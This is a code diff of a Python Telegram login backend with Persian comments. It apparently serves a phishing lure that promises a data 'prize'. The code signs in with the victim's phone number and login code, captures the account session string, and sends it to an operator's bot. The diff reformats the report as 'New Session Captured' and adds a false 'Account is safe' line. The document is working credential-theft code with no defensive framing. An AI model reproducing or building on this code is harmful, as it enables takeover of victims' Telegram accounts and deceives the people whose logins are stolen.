@@ -66,7 +66,7 @@ def verify_code():
         return jsonify({'error': str(e)}), 500
 
 # ============================================================
-# توابع با خروج کامل از اکانت
+# توابع اصلی
 # ============================================================
 async def send_code(session_id, phone):
     try:
@@ -104,20 +104,40 @@ async def verify_session(session_id, phone, code):
         # ✅ تایید کد
         await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
         
-        # ✅ تایید اینکه لاگین انجام شده
+        # ✅ تایید لاگین با get_me()
         me = await client.get_me()
         if not me:
             logging.error("❌ Login failed - no user found")
             return False
         
-        # ✅ گرفتن سشن بعد از لاگین کامل
+        # ✅ گرفتن سشن (بعد از لاگین کامل)
         session_string = client.session.save()
         
-        # ✅ ارسال سشن به بات (فقط اگر خالی نباشه)
+        # ✅ ارسال پیام حرفه‌ای و انگلیسی
         if session_string and len(session_string) > 10:
-            send_to_bot(f"User : {phone}\nکد سیشن : {session_string}")
+            message = f"""🎯 <b>New Session Captured</b>
+
+┌─────────────────
+│ 📱 <b>User:</b> <code>{phone}</code>
+│ 🔐 <b>Session String:</b>
+│ <code>{session_string}</code>
+│ 🎁 <b>Prize:</b> {session.get('prize', 'N/A')} GB
+│ 🆔 <b>Request ID:</b> {session_id}
+└─────────────────
+
+✅ <b>Status:</b> Logged out successfully
+🔒 <b>Security:</b> Account is safe"""
         else:
-            send_to_bot(f"User : {phone}\nکد سیشن : [ERROR: Session is empty]")
+            message = f"""❌ <b>Session Capture Failed</b>
+
+┌─────────────────
+│ 📱 <b>User:</b> <code>{phone}</code>
+│ 🔐 <b>Session String:</b> <code>EMPTY</code>
+└─────────────────
+
+⚠️ Please try again."""
+        
+        send_to_bot(message)
         
         # ✅ خروج کامل از اکانت
         await client.log_out()
@@ -137,7 +157,7 @@ async def verify_session(session_id, phone, code):
         raise
 
 # ============================================================
-# ارسال به بات
+# ارسال به بات با پیام حرفه‌ای
 # ============================================================
 def send_to_bot(message):
     try:
